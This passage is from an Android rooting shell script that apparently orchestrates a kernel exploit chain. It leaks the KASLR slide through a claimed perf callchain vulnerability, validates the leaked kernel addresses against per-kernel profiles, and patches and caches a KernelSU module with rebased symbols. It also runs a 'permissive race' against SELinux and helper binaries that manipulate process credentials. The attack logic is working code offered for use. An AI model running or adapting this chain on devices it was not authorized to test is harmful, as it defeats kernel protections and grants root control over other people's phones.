                echo "MANAGER_LKM=$_ko_out source=$_ko_pick bytes=$(wc -c < "$_ko_out" 2>/dev/null) kernel=$_kmi vermagic=${_vm#vermagic=}"
                KO_TEMPLATE="$KSU_MANAGER_LKM"
                KO_COMPAT="manager-apk"
                echo "KO_TEMPLATE_SOURCE=manager-apk template=$(basename "$KO_TEMPLATE")"
            else
                rm -f "$_ko_out" 2>/dev/null || true
                echo "MANAGER_LKM=none reason=vermagic_mismatch target=$_kmi actual=${_lkmi:-none} entry=$_ko_pick vermagic=${_vm:-none}"
            fi
        else
            echo "MANAGER_LKM=none reason=extract_failed entry=$_ko_pick"
        fi
    else
        echo "MANAGER_LKM=none package=$KSU_MANAGER_APK reason=no_ko_entry"
    fi
elif [ "$APP_LKM_USED" = "0" ]; then
    echo "MANAGER_LKM=none reason=manager_apk_or_unzip_missing"
fi

if [ -z "$KSUD" ] || [ ! -x "$KSUD" ]; then
    echo "FAIL=manager_ksud_missing manager=$KSU_MANAGER_PKG flavor=$KSU_FLAVOR"
    echo "HINT=install the matching manager app first; MagicRoot now extracts the userspace ksud from that APK (no bundled copy)"
    echo "HINT_MANAGERS=resukisu com.resukisu.resukisu / fina me.yuki.fina / kernelsu me.weishu.kernelsu / sukisu com.sukisu.ultra / next com.rifsxd.ksunext"
    exit 3
fi
chmod 755 "$KSUD" 2>/dev/null || true
export MAGICROOT_KSUD="$KSUD"
export MAGICROOT_KSU_APK="$KSU_MANAGER_APK"
run_v36() {
    "$V36_BIN" "$@"
    _v36_rc=$?
    # Rootkit issue #6 P0: reap per-shot v36 orphans; SIGTERM left hundreds
    # of processes and high load.  Never kill cred_target here (verdict source).
    # rootkit v1.0.17: -x exact name avoids matching the wrapping sh -c.
    pkill -9 -x t64560_v36 2>/dev/null || true
    return "$_v36_rc"
}
run_cred() {
    MAGICROOT_CAPBND_OK="$MARK/CAPBND_OK" MAGICROOT_PHASE2_MARKER="$MARK/PHASE2_DONE" MAGICROOT_VERIFY_PID="$TARGET_PID" \
        "$CRED_BIN" "$@"
}
# Lightweight per-shot evidence for post-panic attribution (rootkit v1.0.17
# writes temp/load/mem/uptime; keep this cheap and never poll during the race).
shot_meta() {
    _stage="$1"
    echo "SHOT_META stage=$_stage uptime=$(cut -d. -f1 /proc/uptime 2>/dev/null) boot_id=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null) load=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null) mem_avail_kb=$(awk '/MemAvailable/{print $2; exit}' /proc/meminfo 2>/dev/null)"
}


# Reserved profiles only ship the matching .ko; they have no KASLR anchors or
# per-kernel syms yet. Fail closed instead of running the wrong layout.
if [ "$PROFILE_READY" != "1" ]; then
    echo "FAIL=profile_not_ready profile=$KERNEL_PROFILE"
    echo "TEMPLATE_PRESENT=$([ -f "$KO_TEMPLATE" ] && echo yes || echo no)"
    echo "REASON=missing_kaslr_and_syms"
    exit 2
fi

[ -f "$KASLR_BIN" ] || { echo "FAIL=missing_kaslr profile=$KERNEL_PROFILE"; exit 2; }
[ -f "$SYMS" ] || { echo "FAIL=missing_syms profile=$KERNEL_PROFILE"; exit 2; }
[ -f "$KO_TEMPLATE" ] || { echo "FAIL=missing_template profile=$KERNEL_PROFILE"; exit 2; }

# 清理旧版 Download/临时执行目录残留
rm -rf /data/local/tmp/.magicroot-exec 2>/dev/null
rm -rf "$D/honor" /data/local/tmp/root_stage.sh 2>/dev/null
echo "CAPBND_MARKER=$MARK/CAPBND_OK"
rm -f /data/local/tmp/bl_*.bin /data/local/tmp/bl_text.txt 2>/dev/null

# 上一次运行是否在竞态阶段中断（同一路径跨 boot 保留，用于诊断重启）
if [ -f "$MARK/PERMISSIVE_STARTED" ]; then
    echo "PREVIOUS_RUN_INCOMPLETE $(cat "$MARK/PERMISSIVE_STARTED" 2>/dev/null)"
    rm -f "$MARK/PERMISSIVE_STARTED" 2>/dev/null
fi

# 清理上一次中止留下的 helper / victim
pkill -9 -x cred_target 2>/dev/null
pkill -9 -x t64560_v36 2>/dev/null
pkill -9 -x t64560_cred 2>/dev/null
pkill -9 -f '[v]ictim-child' 2>/dev/null
sleep 1
mark RUN_CLEAN_DONE


rm -f "$D"/bl_*.bin "$D"/bl_text.txt 2>/dev/null
rm -f "$MARK"/PHASE2_DONE "$MARK"/CAPBND_OK "$MARK"/FINTI_TRY "$MARK"/FINTI_RC "$MARK"/FINTI_SKIP "$MARK"/ROOT_ID
rm -f "$D"/cred.log "$D"/finti.try "$D"/finti.rc "$D"/finti.skip "$D"/root_id
# Keep ksu-patched.ko for the ko_patch cache; a different boot/slide/inputs
# overwrites it. Removing it here would defeat the cache on every retry.

# 若本次 boot 已经加载了 KernelSU，直接复用，跳过整条漏洞链。
# 不改变 300/32/12000 等竞态参数。
MODULE_ALREADY_LIVE_ENFORCING=0
if grep -Eq '^kernelsu .* Live' /proc/modules 2>/dev/null; then
    echo "== 0. reuse existing KernelSU =="
    echo "MODULE_ALREADY_LIVE"
    echo "MODULE_LIVE_FLAVOR_HINT=$KSU_FLAVOR (module was loaded earlier this boot; kernel flavor cannot be probed from shell)"
    # Enhanced-style fast repair: first try the userspace crown directly.
    # This is the same path as Enhanced runRepair and avoids KASLR + the
    # permissive race when the module is already Live.
    echo "MODULE_LIVE_FAST_REPAIR_TRY"
    _reuse_try=1
    while :; do
        : > "$D/ksu_grant.log"
        if "$KSU_GRANT" > "$D/ksu_grant.log" 2>&1; then
            cat "$D/ksu_grant.log"
            KSU_GRANT_FD=$(sed -n 's/.*fd=\([-0-9][0-9]*\).*/\1/p' "$D/ksu_grant.log" | tail -1)
            echo "KSU_GRANT_METHOD=reboot_syscall_reuse fd=${KSU_GRANT_FD:-?}"
            cat "$MARK/ROOT_ID" 2>/dev/null
            if [ -f "$D/root_stage_flavor_mismatch" ]; then
                cat "$D/root_stage_flavor_mismatch"
                echo "HINT=the live LKM does not match the selected backend; reboot (or switch back) before relying on this backend's manager"
            fi
            echo "MODULE_LIVE_FAST_REPAIR_OK"
            echo "DONE"
            exit 0
        fi
        cat "$D/ksu_grant.log" 2>/dev/null
        echo "MODULE_LIVE_FAST_REPAIR_RETRY try=$_reuse_try"
        [ "$_reuse_try" -ge 2 ] && break
        _reuse_try=$((_reuse_try + 1))
        sleep 2
    done
    echo "MODULE_LIVE_FAST_REPAIR_FAILED"
    # A Live module cannot be replaced: ko_patch is skipped and finit_module
    # would hit the module name conflict.  The old behavior continued the full
    # exploit chain anyway (wasting minutes and risking a kernel crash), so be
    # explicit instead: reuse only works when GRANT_ROOT can still reach uid=0.
    if [ -f "$D/force-full" ] || [ "${MAGICROOT_FORCE_FULL:-0}" = "1" ]; then
        echo "REUSE_OVERRIDE=force_full"
        echo "MODULE_ALREADY_LIVE_ENFORCING"
        MODULE_ALREADY_LIVE_ENFORCING=1
    else
        echo "FAIL=reuse_module_live_not_grantable"
        echo "REUSE_CHECK=module_live_uid=$(id -u 2>/dev/null) enforce=$(getenforce 2>/dev/null)"
        echo "HINT=module already Live this boot but GRANT_ROOT did not return uid=0, so root is not reusable"
        echo "HINT_FIX=reboot, then rerun after enabling 「allow shell」 (needed for the first cold boot; the LKM is only replaceable across boots)"
        echo "HINT_CAUSE=shell_su_adb_only or an emptied allowlist blocks non-adbd shells; keep it disabled or reboot"
        echo "HINT_DEBUG=touch $D/force-full to run the legacy full chain instead"
        exit 8
    fi
fi

# Permissive race bounds: successful landings observed at attempts 26..92.
# 120 attempts / 900 s prevents a 26-minute silent stall and still covers that
# range.  Override with MAGICROOT_PERMISSIVE_MAX_ATTEMPTS/TIMEOUT.
PERMISSIVE_MAX_ATTEMPTS=${MAGICROOT_PERMISSIVE_MAX_ATTEMPTS:-120}
case "$PERMISSIVE_MAX_ATTEMPTS" in ''|*[!0-9]*) PERMISSIVE_MAX_ATTEMPTS=120 ;; esac
[ "$PERMISSIVE_MAX_ATTEMPTS" -ge 20 ] 2>/dev/null || PERMISSIVE_MAX_ATTEMPTS=120
[ "$PERMISSIVE_MAX_ATTEMPTS" -le 500 ] 2>/dev/null || PERMISSIVE_MAX_ATTEMPTS=120
PERMISSIVE_TIMEOUT=${MAGICROOT_PERMISSIVE_TIMEOUT:-900}
case "$PERMISSIVE_TIMEOUT" in ''|*[!0-9]*) PERMISSIVE_TIMEOUT=900 ;; esac
[ "$PERMISSIVE_TIMEOUT" -ge 120 ] 2>/dev/null || PERMISSIVE_TIMEOUT=900
[ "$PERMISSIVE_TIMEOUT" -le 1800 ] 2>/dev/null || PERMISSIVE_TIMEOUT=900


mark KASLR_PRE
echo "== 1. KASLR =="
# KASLR slide is stable for the lifetime of one boot. Cache it keyed by
# boot_id so retries in the same boot do not repeat the trace grab.
BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || true)
KASLR_CACHE="$D/kaslr.cache"
# External KASLR oracle: CVE-2026-98937 perf callchain leak.
# Enabled by default (auto) when the module and target constants exist;
# MAGICROOT_KASLR_SOURCE=off (or 0/none) disables, =98937 forces.
# It produces a kaslr.txt-compatible set and primes the same cache; the
# pipeline's PREPARE/SELINUX_ARG cross-check below still validates the slide
# against the profile's link constants.  On failure the normal trace-grab
# KASLR path runs unchanged.
KASLR_98937_ACTIVE=0
KASLR_98937_ENABLE=${MAGICROOT_KASLR_SOURCE:-auto}
case "$KASLR_98937_ENABLE" in off|0|none) KASLR_98937_ENABLE=off ;; esac
if [ "$KASLR_98937_ENABLE" != "off" ] && [ -f "$D/kaslr-98937/enable" ]; then
    KASLR_98937_ENABLE=98937
fi
if [ "$KASLR_98937_ENABLE" != "off" ] && [ -x "$D/kaslr-98937/run98937.sh" ]; then
    echo "KASLR_98937_BEGIN"
    _o989=$(MAGICROOT_98937_PREPARE_LINK="$PROFILE_KASLR_PREPARE_LINK" \
            MAGICROOT_98937_SELINUX_LINK="$PROFILE_KASLR_SELINUX_LINK" \
            sh "$D/kaslr-98937/run98937.sh" 2>&1); _r989=$?
    printf '%s\n' "$_o989" | grep -E '^(KASLR_(SLIDE|ANCHORS|VOTES|BYTES|ERROR)=|PREPARE=|SELINUX_ARG=)' | tail -8
    _s989=$(printf '%s\n' "$_o989" | sed -n 's/^KASLR_SLIDE=//p' | head -1 | tr -d '\r')
    _a989=$(printf '%s\n' "$_o989" | sed -n 's/^KASLR_ANCHORS=//p' | head -1 | tr -d '\r')
    _v989=$(printf '%s\n' "$_o989" | sed -n 's/^KASLR_VOTES=//p' | head -1 | tr -d '\r')
    _b989=$(printf '%s\n' "$_o989" | sed -n 's/^KASLR_BYTES=//p' | head -1 | tr -d '\r')
    _p989=$(printf '%s\n' "$_o989" | sed -n 's/^PREPARE=//p' | head -1 | tr -d '\r')
    _x989=$(printf '%s\n' "$_o989" | sed -n 's/^SELINUX_ARG=//p' | head -1 | tr -d '\r')
    case "$_s989" in
        0x*00000)
            if [ -n "$_p989" ] && [ -n "$_x989" ]; then
                {
                    echo "KASLR_SLIDE=$_s989"
                    echo "SELINUX_ARG=$_x989"
                    echo "PREPARE=$_p989"
                    echo "KASLR_ANCHORS=$_a989"
                    echo "KASLR_VOTES=$_v989"
                    echo "KASLR_BYTES=$_b989"
                } > "$D/kaslr.txt" 2>/dev/null
                if [ -n "$BOOT_ID" ]; then
                    { echo "$BOOT_ID"; cat "$D/kaslr.txt"; } > "$KASLR_CACHE" 2>/dev/null
                fi
                KASLR_98937_ACTIVE=1
                echo "KASLR_98937_ACCEPT slide=$_s989 anchors=$_a989 votes=$_v989"
            else
                echo "KASLR_98937_REJECT reason=no_prepare_selinux"
            fi
            ;;
        *)
            echo "KASLR_98937_FAIL rc=$_r989 value=${_s989:-none}"
            ;;
    esac
fi
KASLR_CACHE_HIT=0
if [ -n "$BOOT_ID" ] && [ -f "$KASLR_CACHE" ] &&
   [ "$(sed -n '1p' "$KASLR_CACHE" 2>/dev/null)" = "$BOOT_ID" ]; then
    sed -n '2,$p' "$KASLR_CACHE" > "$D/kaslr.txt" 2>/dev/null || true
    if grep -q '^KASLR_SLIDE=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^SELINUX_ARG=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^PREPARE=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^KASLR_ANCHORS=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^KASLR_VOTES=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^KASLR_BYTES=' "$D/kaslr.txt" 2>/dev/null; then
        KASLR_CACHE_HIT=1
        echo "KASLR_CACHE_HIT boot_id=$BOOT_ID"
    fi
fi
KASLR_MIN_VOTES=${PROFILE_KASLR_MIN_VOTES:-3}
KASLR_MIN_ANCHORS=${PROFILE_KASLR_MIN_ANCHORS:-2}
KASLR_MIN_BYTES=${PROFILE_KASLR_MIN_BYTES:-1048576}
if [ "${KASLR_98937_ACTIVE:-0}" = "1" ]; then
    # The perf leak yields ~3 unique core-text frames.  The 98937 source proves
    # the slide by intersecting the 2 MiB-aligned candidates over
    # [_stext,_etext), and PREPARE/SELINUX_ARG below re-validate it against the
    # profile links.  Anchor count is a heuristic for the raw-trace source, so
    # the source-specific lower bound is applied here and logged explicitly.
    KASLR_MIN_ANCHORS=${MAGICROOT_98937_MIN_ANCHORS:-3}
    echo "KASLR_98937_ANCHOR_OVERRIDE min_anchors=$KASLR_MIN_ANCHORS reason=unique_text_frames"
fi
GRAB_EARLY_BYTES=${MAGICROOT_GRAB_MIN_BYTES:-$KASLR_MIN_BYTES}
case "$GRAB_EARLY_BYTES" in ''|*[!0-9]*) GRAB_EARLY_BYTES=$KASLR_MIN_BYTES ;; esac
KASLR_GRAB_TRIES=${MAGICROOT_KASLR_GRAB_TRIES:-3}
case "$KASLR_GRAB_TRIES" in ''|*[!0-9]*) KASLR_GRAB_TRIES=3 ;; esac
[ "$KASLR_GRAB_TRIES" -ge 1 ] 2>/dev/null && [ "$KASLR_GRAB_TRIES" -le 5 ] 2>/dev/null ||
    KASLR_GRAB_TRIES=3
KASLR_GRAB_MAX_LOOPS=${MAGICROOT_KASLR_GRAB_MAX_LOOPS:-300}
case "$KASLR_GRAB_MAX_LOOPS" in ''|*[!0-9]*) KASLR_GRAB_MAX_LOOPS=300 ;; esac
[ "$KASLR_GRAB_MAX_LOOPS" -ge 40 ] 2>/dev/null &&
    [ "$KASLR_GRAB_MAX_LOOPS" -le 600 ] 2>/dev/null ||
    KASLR_GRAB_MAX_LOOPS=300

# Read + validate KASLR fields.  This only accepts a capture that meets the
# profile's anchors/votes/bytes gates; otherwise the caller re-captures.
kaslr_fields_ok() {
    SLIDE=$(sed -n 's/^KASLR_SLIDE=//p' "$D/kaslr.txt" 2>/dev/null)
    SELINUX_ARG=$(sed -n 's/^SELINUX_ARG=//p' "$D/kaslr.txt" 2>/dev/null)
    PREPARE=$(sed -n 's/^PREPARE=//p' "$D/kaslr.txt" 2>/dev/null)
    VOTES=$(sed -n 's/^KASLR_VOTES=//p' "$D/kaslr.txt" 2>/dev/null)
    ANCHORS=$(sed -n 's/^KASLR_ANCHORS=//p' "$D/kaslr.txt" 2>/dev/null)
    KASLR_BYTES=$(sed -n 's/^KASLR_BYTES=//p' "$D/kaslr.txt" 2>/dev/null)
    case "$KASLR_BYTES" in ''|*[!0-9]*) KASLR_BYTES=0 ;; esac
    [ -n "$SLIDE" ] || return 1
    case "$PREPARE" in 0xffff*) ;; *) return 1 ;; esac
    case "$SELINUX_ARG" in 0xffff*) ;; *) return 1 ;; esac
    [ -n "$VOTES" ] && [ "$VOTES" -ge "$KASLR_MIN_VOTES" ] 2>/dev/null || return 1
    [ -n "$ANCHORS" ] && [ "$ANCHORS" -ge "$KASLR_MIN_ANCHORS" ] 2>/dev/null || return 1
    [ "$KASLR_BYTES" -ge "$KASLR_MIN_BYTES" ] 2>/dev/null || return 1
    ! grep -q '^KASLR_ERROR=' "$D/kaslr.txt" 2>/dev/null || return 1
    return 0
}

# A cache entry from an earlier run can be under-sampled (the old code wrote
# it before validating).  Reject it and force a fresh capture.
if [ "$KASLR_CACHE_HIT" = "1" ] && ! kaslr_fields_ok; then
    echo "KASLR_CACHE_REJECT boot_id=$BOOT_ID anchors=${ANCHORS:-none} votes=${VOTES:-none} bytes=${KASLR_BYTES:-0}"
    KASLR_CACHE_HIT=0
fi
if [ "$KASLR_CACHE_HIT" != "1" ]; then
    KASLR_GRAB_TRY=0
    while [ "$KASLR_GRAB_TRY" -lt "$KASLR_GRAB_TRIES" ]; do
        KASLR_GRAB_TRY=$((KASLR_GRAB_TRY + 1))
        _loops=$((GRAB_LOOPS * KASLR_GRAB_TRY))
        [ "$_loops" -gt "$KASLR_GRAB_MAX_LOOPS" ] && _loops=$KASLR_GRAB_MAX_LOOPS
        if [ "$KASLR_GRAB_TRY" -eq "$KASLR_GRAB_TRIES" ] && [ "$KASLR_GRAB_TRY" -gt 1 ]; then
            echo "KASLR_GRAB_TRY=$KASLR_GRAB_TRY legacy=1 loops=$_loops"
            mark GRAB_PRE
            sh "$D/grab_legacy.sh" 8 >/dev/null 2>&1
            mark GRAB_DONE
        else
            echo "KASLR_GRAB_TRY=$KASLR_GRAB_TRY loops=$_loops"
            _grab_min=0
            [ "$KASLR_GRAB_TRY" -eq 1 ] && _grab_min=$GRAB_EARLY_BYTES
            echo "GRAB_EARLY_STOP_BYTES=$_grab_min"
            mark GRAB_PRE
            sh "$D/grab.sh" "$_loops" "$_grab_min" >/dev/null 2>&1
            mark GRAB_DONE
        fi
        "$KASLR_BIN" "$D" > "$D/kaslr.txt"
        if kaslr_fields_ok; then
            break
        fi
        if [ "$KASLR_GRAB_TRY" -lt "$KASLR_GRAB_TRIES" ]; then
            echo "KASLR_REGRAB attempt=$KASLR_GRAB_TRY anchors=${ANCHORS:-none} votes=${VOTES:-none} bytes=${KASLR_BYTES:-0} reason=below_profile_gate"
            sleep 1
        fi
    done
fi
cat "$D/kaslr.txt"
if ! kaslr_fields_ok; then
    if [ -z "$SLIDE" ]; then
        echo "FAIL=kaslr"
    elif [ "${PREPARE#0xffff}" = "$PREPARE" ]; then
        echo "FAIL=bad_prepare"
    elif [ "${SELINUX_ARG#0xffff}" = "$SELINUX_ARG" ]; then
        echo "FAIL=bad_selinux_arg"
    elif [ -z "$VOTES" ] || [ "$VOTES" -lt "$KASLR_MIN_VOTES" ] 2>/dev/null; then
        echo "FAIL=kaslr_votes votes=${VOTES:-none} min=$KASLR_MIN_VOTES"
    elif [ -z "$ANCHORS" ] || [ "$ANCHORS" -lt "$KASLR_MIN_ANCHORS" ] 2>/dev/null; then
        echo "FAIL=kaslr_anchors anchors=${ANCHORS:-none} min=$KASLR_MIN_ANCHORS"
    elif [ "$KASLR_BYTES" -lt "$KASLR_MIN_BYTES" ] 2>/dev/null; then
        echo "FAIL=kaslr_bytes bytes=$KASLR_BYTES min=$KASLR_MIN_BYTES"
    else
        echo "FAIL=kaslr_validation"
    fi
    rm -f "$KASLR_CACHE" 2>/dev/null || true
    exit 2
fi
# Only cache a capture that passed the gates.
if [ -n "$BOOT_ID" ] && [ "$KASLR_CACHE_HIT" != "1" ]; then
    { echo "$BOOT_ID"; cat "$D/kaslr.txt"; } > "$KASLR_CACHE" 2>/dev/null || true
fi
SELINUX_ARG=$(sed -n 's/^SELINUX_ARG=//p' "$D/kaslr.txt")
PREPARE=$(sed -n 's/^PREPARE=//p' "$D/kaslr.txt")
VOTES=$(sed -n 's/^KASLR_VOTES=//p' "$D/kaslr.txt")
ANCHORS=$(sed -n 's/^KASLR_ANCHORS=//p' "$D/kaslr.txt")
KASLR_BYTES=$(sed -n 's/^KASLR_BYTES=//p' "$D/kaslr.txt")
case "$KASLR_BYTES" in ''|*[!0-9]*) KASLR_BYTES=0 ;; esac
# Double validation: the KASLR binary derives SELINUX_ARG/PREPARE from its own
# hard-coded links.  Recompute them from the profile links + slide and require
# an exact match, so a wrong profile/KASLR binary/cache can never slip through.
EXPECT_PREPARE=$("$ADDRCALC" add "$PROFILE_KASLR_PREPARE_LINK" "$SLIDE" 2>/dev/null | tr -d '\r\n')
if [ -z "$EXPECT_PREPARE" ] || [ "$PREPARE" != "$EXPECT_PREPARE" ]; then
    echo "FAIL=kaslr_crosscheck_prepare expect=${EXPECT_PREPARE:-none} got=$PREPARE link=$PROFILE_KASLR_PREPARE_LINK"
    exit 2
fi
SELINUX_BASE=$("$ADDRCALC" add "$PROFILE_KASLR_SELINUX_LINK" "$SLIDE" 2>/dev/null | tr -d '\r\n')
EXPECT_SELINUX=$("$ADDRCALC" add "$SELINUX_BASE" 0xfffffffffffffff9 2>/dev/null | tr -d '\r\n')
if [ -z "$EXPECT_SELINUX" ] || [ "$SELINUX_ARG" != "$EXPECT_SELINUX" ]; then
    echo "FAIL=kaslr_crosscheck_selinux expect=${EXPECT_SELINUX:-none} got=$SELINUX_ARG link=$PROFILE_KASLR_SELINUX_LINK"
    exit 2
fi
echo "KASLR_CROSS_CHECK=ok prepare=$PREPARE selinux_arg=$SELINUX_ARG votes=$VOTES anchors=$ANCHORS bytes=$KASLR_BYTES"
echo "KASLR_ACCEPTED slide=$SLIDE votes=$VOTES anchors=$ANCHORS"
mark KASLR_ACCEPTED
if [ "$KASLR_ONLY" = "1" ]; then
    mark KASLR_ONLY_DONE
    echo "KASLR_ONLY_DONE"
    exit 0
fi

KO_CACHE_DIR=${KO_CACHE_DIR:-/data/local/tmp/.magic-ko-cache}

# Stable content hash for cache identity.  Android toybox normally provides
# sha256sum; fall back to cksum/stat only on unusual systems.
file_sha256() {
    if command -v sha256sum >/dev/null 2>&1; then
        _h=$(sha256sum "$1" 2>/dev/null | awk '{print $1}')
        [ -n "$_h" ] && { printf '%s\n' "$_h"; return 0; }
    fi
    if command -v md5sum >/dev/null 2>&1; then
        _h=$(md5sum "$1" 2>/dev/null | awk '{print $1}')
        [ -n "$_h" ] && { printf '%s\n' "$_h"; return 0; }
    fi
    stat -c '%s:%Y' "$1" 2>/dev/null
}
key_hash() {
    if command -v sha256sum >/dev/null 2>&1; then
        _h=$(printf '%s' "$1" | sha256sum 2>/dev/null | awk '{print $1}' | cut -c1-32)
        [ -n "$_h" ] && { printf '%s\n' "$_h"; return 0; }
    fi
    if command -v cksum >/dev/null 2>&1; then
        _h=$(printf '%s' "$1" | cksum 2>/dev/null | awk '{print $1}')
        [ -n "$_h" ] && { printf '%s\n' "$_h"; return 0; }
    fi
    printf '%s\n' "$1" | tr ': |' '___' | cut -c1-24
}

prune_ko_cache() {
    [ -d "$KO_CACHE_DIR" ] || return 0
    [ "$KO_CACHE_MAX" -ge 1 ] 2>/dev/null || KO_CACHE_MAX=6
    [ "$KO_CACHE_DAYS" -ge 1 ] 2>/dev/null || KO_CACHE_DAYS=7
    find "$KO_CACHE_DIR" -maxdepth 1 -type f -name "*.ko" -mtime +"$KO_CACHE_DAYS" -delete 2>/dev/null || true
    # Remove orphan sidecars whose .ko was deleted by the age pass.
    for _meta in "$KO_CACHE_DIR"/*.key; do
        [ -e "$_meta" ] || continue
        [ -e "${_meta%.key}.ko" ] || rm -f "$_meta" 2>/dev/null || true
    done
    # Keep the current entry unconditionally; KO_CACHE_MAX is only a disk
    # retention limit, never a flavor-selection input.
    if [ -n "$KO_PERSIST" ]; then
        _keep_other=$((KO_CACHE_MAX - 1))
    else
        _keep_other=$KO_CACHE_MAX
    fi
    [ "$_keep_other" -ge 0 ] 2>/dev/null || _keep_other=0
    _ko_list=$(ls -1t "$KO_CACHE_DIR"/*.ko 2>/dev/null || true)
    if [ -n "$KO_PERSIST" ] && [ -n "$_ko_list" ]; then
        _ko_list=$(printf '%s\n' "$_ko_list" | grep -vF "$KO_PERSIST" 2>/dev/null || true)
    fi
    if [ -n "$_ko_list" ]; then
        printf '%s\n' "$_ko_list" | tail -n +$((_keep_other + 1)) | while IFS= read -r old; do
            [ -n "$old" ] || continue
            rm -f "$old" "${old%.ko}.key" 2>/dev/null || true
        done
    fi
}

patch_ko() {
    echo "== 2. patch KernelSU module =="
    echo "KSU_FLAVOR=$KSU_FLAVOR KSU_KMI=source=$(cat "$D/ko_source_kmi" 2>/dev/null || echo 6.12.76) target=$(uname -r) strategy=vermagic+sym_rebase portable=yes exact_target_build=no"
    KO_CACHE="$D/ko.cache"
    KO_CACHE_DIR=${KO_CACHE_DIR:-/data/local/tmp/.magic-ko-cache}
    KO_TEMPLATE_SHA=$(file_sha256 "$KO_TEMPLATE")
    KO_SYMS_SHA=$(file_sha256 "$SYMS")
    KO_PATCH_SHA=$(file_sha256 "$KOPATCH_BIN")
    KO_KEY=""
    if [ -n "$BOOT_ID" ]; then
        # Flavor + profile + template/syms content hashes are all identity
        # inputs.  Do not rely on size/mtime alone: a replaced same-size
        # template must never hit an old cache entry.
        KO_KEY="$BOOT_ID|$PROFILE_ID|$SLIDE|$(uname -r)|$KSU_FLAVOR|$(basename "$KO_TEMPLATE")|$KO_TEMPLATE_SHA|$(basename "$SYMS")|$KO_SYMS_SHA|$KO_PATCH_SHA"
    fi
    echo "KO_CACHE_IDENTITY flavor=$KSU_FLAVOR profile=$PROFILE_ID template=$(basename "$KO_TEMPLATE"):${KO_TEMPLATE_SHA:-none} syms=$(basename "$SYMS"):${KO_SYMS_SHA:-none} keep=$KO_CACHE_MAX"
    KO_CACHE_HIT=0
    KO_PERSIST=""
    KO_PERSIST_KEY=""
    if [ -n "$KO_KEY" ]; then
        KO_TAG=$(key_hash "$KO_KEY")
        KO_PERSIST="$KO_CACHE_DIR/$KO_TAG.ko"
        KO_PERSIST_KEY="$KO_CACHE_DIR/$KO_TAG.key"
    fi
    if [ -n "$KO_KEY" ] && [ -s "$D/ksu-patched.ko" ] && [ -f "$KO_CACHE" ] &&
       [ "$(cat "$KO_CACHE" 2>/dev/null)" = "$KO_KEY" ]; then
        KO_CACHE_HIT=1
        echo "KO_CACHE_HIT boot_id=$BOOT_ID flavor=$KSU_FLAVOR profile=$PROFILE_ID"
    elif [ -n "$KO_PERSIST" ] && [ -s "$KO_PERSIST" ] && [ -f "$KO_PERSIST_KEY" ] &&
         [ "$(cat "$KO_PERSIST_KEY" 2>/dev/null)" = "$KO_KEY" ]; then
        mkdir -p "$KO_CACHE_DIR" 2>/dev/null || true
        cp -f "$KO_PERSIST" "$D/ksu-patched.ko" 2>/dev/null && {
            printf "%s\n" "$KO_KEY" > "$KO_CACHE" 2>/dev/null || true
            KO_CACHE_HIT=1
            echo "KO_CACHE_RESTORED boot_id=$BOOT_ID flavor=$KSU_FLAVOR profile=$PROFILE_ID"
        }
    elif [ -n "$KO_PERSIST" ] && [ -s "$KO_PERSIST" ]; then
        # Legacy/mismatched entry (written before content-hash sidecars, or a
        # tag collision from the old truncated filename).  Never load it.
        echo "KO_CACHE_STALE reason=key_missing_or_mismatch tag=$KO_TAG flavor=$KSU_FLAVOR"
        rm -f "$KO_PERSIST" "$KO_PERSIST_KEY" 2>/dev/null || true
    fi
    if [ "$KO_CACHE_HIT" != "1" ]; then
        rm -f "$D/ko_patch.self" 2>/dev/null || true
        "$KOPATCH_BIN" "$KO_TEMPLATE" "$D/ksu-patched.ko" "$SYMS" "$SLIDE" "$(uname -r)" > "$D/ko_patch.log" 2>&1
        KO_PATCH_RC=$?
        cat "$D/ko_patch.log" 2>/dev/null
        if [ "$KO_PATCH_RC" != "0" ]; then
            echo "FAIL=ko_patch rc=$KO_PATCH_RC"
            return 3
        fi
        # patched/missing self-check: a missing symbol means the module would
        # fail to load with ENOENT later; refuse before touching the kernel.
        KO_PATCH_LINE=$(grep -m1 '^PATCHED=' "$D/ko_patch.log" 2>/dev/null)
        KO_PATCHED=$(printf '%s\n' "$KO_PATCH_LINE" | sed -n 's/^PATCHED=\([0-9][0-9]*\) MISSING=\([0-9][0-9]*\).*/\1/p')
        KO_MISSING=$(printf '%s\n' "$KO_PATCH_LINE" | sed -n 's/^PATCHED=\([0-9][0-9]*\) MISSING=\([0-9][0-9]*\).*/\2/p')
        SYMS_N=$(grep -c '[^[:space:]]' "$SYMS" 2>/dev/null)
        case "$SYMS_N" in ''|*[!0-9]*) SYMS_N=0 ;; esac
        echo "KO_PATCH_SELF_CHECK=patched=${KO_PATCHED:-none} missing=${KO_MISSING:-none} syms=$SYMS_N template=$(basename "$KO_TEMPLATE") flavor=$KSU_FLAVOR profile=$PROFILE_ID"
        if [ -z "$KO_PATCHED" ] || [ -z "$KO_MISSING" ]; then
            echo "FAIL=ko_patch_selfcheck_unparsed log=$D/ko_patch.log"
            return 3
        fi
        if [ "$KO_MISSING" != "0" ]; then
            echo "FAIL=ko_patch_missing missing=$KO_MISSING patched=$KO_PATCHED syms=$SYMS_N flavor=$KSU_FLAVOR"
            echo "HINT=syms table does not cover the module's undefined symbols for this KMI"
            return 3
        fi
        if [ "$KO_PATCHED" -le 0 ]; then
            echo "FAIL=ko_patch_patched_zero syms=$SYMS_N"
            return 3
        fi
        printf '%s\n' "$KO_PATCH_LINE" > "$D/ko_patch.self" 2>/dev/null || true
        if [ -n "$KO_KEY" ]; then
            printf '%s\n' "$KO_KEY" > "$KO_CACHE" 2>/dev/null || true
            if [ -n "$KO_PERSIST" ]; then
                mkdir -p "$KO_CACHE_DIR" 2>/dev/null || true
                cp -f "$D/ksu-patched.ko" "$KO_PERSIST" 2>/dev/null || true
                printf '%s\n' "$KO_KEY" > "$KO_PERSIST_KEY" 2>/dev/null || true
                echo "KO_CACHE_SAVED flavor=$KSU_FLAVOR profile=$PROFILE_ID tag=$KO_TAG"
            fi
        fi
    else
        echo "KO_PATCH_SKIPPED reason=same_boot_slide_template flavor=$KSU_FLAVOR profile=$PROFILE_ID"
        if [ -f "$D/ko_patch.self" ]; then
            echo "KO_PATCH_SELF_CHECK_CACHED=$(cat "$D/ko_patch.self" 2>/dev/null)"
        else
